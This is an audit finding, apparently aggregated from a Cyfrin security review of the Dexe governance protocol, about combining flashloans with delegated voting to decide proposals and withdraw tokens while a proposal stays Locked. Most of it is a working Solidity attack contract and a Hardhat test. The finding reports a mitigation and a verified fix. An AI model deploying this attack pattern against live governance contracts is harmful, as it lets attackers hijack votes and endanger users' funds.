---
# Core Classification
protocol: Dexe
chain: everychain
category: economic
vulnerability_type: vote

# Attack Vector Details
attack_type: vote
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 27294
audit_firm: Cyfrin
contest_link: none
source_link: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md
github_link: none

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.60
financial_impact: high

# Scoring
quality_score: 3
rarity_score: 5

# Context Tags
tags:
  - vote
  - flash_loan
  - delegate

protocol_categories:
  - algo-stables

# Audit Details
report_date: unknown
finders_count: 2
finders:
  - Dacian
  - 0kage
---

## Vulnerability Title

Attacker can combine flashloan with delegated voting to decide a proposal and withdraw their tokens while the proposal is still in Locked state

### Overview


A bug report has been filed which highlights an attack vector that allows attackers to bypass existing flashloan mitigations. This is achieved by combining flashloan with delegated voting, allowing the attacker to decide the outcome of proposals while the proposal is still in the Locked state. The attack can be performed in one transaction via an attack contract. 

The impact of this attack is that the attacker can bypass existing flashloan mitigations. A proof of concept was provided which adds an attack contract to `mock/utils/FlashDelegationVoteAttack.sol` and a unit test to `GovPool.test.js` under `describe("getProposalState()", () => {`. The test can be run with `npx hardhat test --grep "audit attacker combine flash loan with delegation"`.

The recommended mitigation for this attack is to consider additional defensive measures such as not allowing delegation/undelegation & deposit/withdrawal in the same block. The bug has been fixed in PR166 and verified by Cyfrin.

### Original Finding Content

**Description:** Attacker can combine a flashloan with delegated voting to bypass the existing flashloan mitigations, allowing the attacker to decide a proposal & withdraw their tokens while the proposal is still in the Locked state. The entire attack can be performed in 1 transaction via an attack contract.

**Impact:** Attacker can bypass existing flashloan mitigations to decide the outcome of proposals by combining flashloan with delegated voting.

**Proof of Concept:** Add the attack contract to `mock/utils/FlashDelegationVoteAttack.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../../interfaces/gov/IGovPool.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FlashDelegationVoteAttack {
    //
    // how the attack contract works:
    //
    // 1) use flashloan to acquire large amount of voting tokens
    //    (caller transfer tokens to contract before calling to simplify PoC)
    // 2) deposit voting tokens into GovPool
    // 3) delegate voting power to slave contract
    // 4) slave contract votes with delegated power
    // 5) proposal immediately reaches quorum and moves into Locked state
    // 6) undelegate voting power from slave contract
    //    since undelegation works while Proposal is in locked state
    // 7) withdraw voting tokens from GovPool while proposal still in Locked state
    // 8) all in 1 txn
    //

    function attack(address govPoolAddress, address tokenAddress, uint256 proposalId) external {
        // verify that the attack contract contains the voting tokens
        IERC20 votingToken = IERC20(tokenAddress);

        uint256 votingPower = votingToken.balanceOf(address(this));
        require(votingPower > 0, "AttackContract: need to send tokens first");

        // create the slave contract that this contract will delegate to which
        // will do the actual vote
        FlashDelegationVoteAttackSlave slave = new FlashDelegationVoteAttackSlave();

        // deposit our tokens with govpool
        IGovPool govPool = IGovPool(govPoolAddress);

        // approval first
        (, address userKeeperAddress, , , ) = govPool.getHelperContracts();
        votingToken.approve(userKeeperAddress, votingPower);

        // then actual deposit
        govPool.deposit(address(this), votingPower, new uint256[](0));

        // verify attack contract has no tokens
        require(
            votingToken.balanceOf(address(this)) == 0,
            "AttackContract: balance should be 0 after depositing tokens"
        );

        // delegate our voting power to the slave
        govPool.delegate(address(slave), votingPower, new uint256[](0));

        // slave does the actual vote
        slave.vote(govPool, proposalId);

        // verify proposal now in Locked state as quorum was reached
        require(
            govPool.getProposalState(proposalId) == IGovPool.ProposalState.Locked,
            "AttackContract: proposal didnt move to Locked state after vote"
        );

        // undelegate our voting power from the slave
        govPool.undelegate(address(slave), votingPower, new uint256[](0));

        // withdraw our tokens
        govPool.withdraw(address(this), votingPower, new uint256[](0));

        // verify attack contract has withdrawn all tokens used in the delegated vote
        require(
            votingToken.balanceOf(address(this)) == votingPower,
            "AttackContract: balance should be full after withdrawing"
        );

        // verify proposal still in the Locked state
        require(
            govPool.getProposalState(proposalId) == IGovPool.ProposalState.Locked,
            "AttackContract: proposal should still be in Locked state after withdrawing tokens"
        );

        // attack contract can now repay flash loan
    }
}

contract FlashDelegationVoteAttackSlave {
    function vote(IGovPool govPool, uint256 proposalId) external {
        // slave has no voting power so votes 0, this will automatically
        // use the delegated voting power
        govPool.vote(proposalId, true, 0, new uint256[](0));
    }
}
```

Add the unit test to `GovPool.test.js` under `describe("getProposalState()", () => {`:
```javascript
      it("audit attacker combine flash loan with delegation to decide vote then immediately withdraw loaned tokens by undelegating", async () => {
        await changeInternalSettings(false);

        // setup the proposal
        let proposalId = 2;
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(proposalId, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(proposalId, wei("100"), [], false)]]
        );

        assert.equal(await govPool.getProposalState(proposalId), ProposalState.Voting);

        // setup the attack contract
        const AttackContractMock = artifacts.require("FlashDelegationVoteAttack");
        let attackContract = await AttackContractMock.new();

        // give SECOND's tokens to the attack contract
        let voteAmt = wei("100000000000000000000");
        await govPool.withdraw(attackContract.address, voteAmt, [], { from: SECOND });

        // execute the attack
        await attackContract.attack(govPool.address, token.address, proposalId);
      });
```

Run the test with: `npx hardhat test --grep "audit attacker combine flash loan with delegation"`.

**Recommended Mitigation:** Consider additional defensive measures such as not allowing delegation/undelegation & deposit/withdrawal in the same block.

**Dexe:**
Fixed in [PR166](https://github.com/dexe-network/DeXe-Protocol/commit/30b56c87c6c4902ec5a4c470d8a2812cd43dc53c).

**Cyfrin:** Verified.

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 3/5 |
| Rarity Score | 5/5 |
| Audit Firm | Cyfrin |
| Protocol | Dexe |
| Report Date | N/A |
| Finders | Dacian, 0kage |

### Source Links

- **Source**: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`Vote, Flash Loan, Delegate`

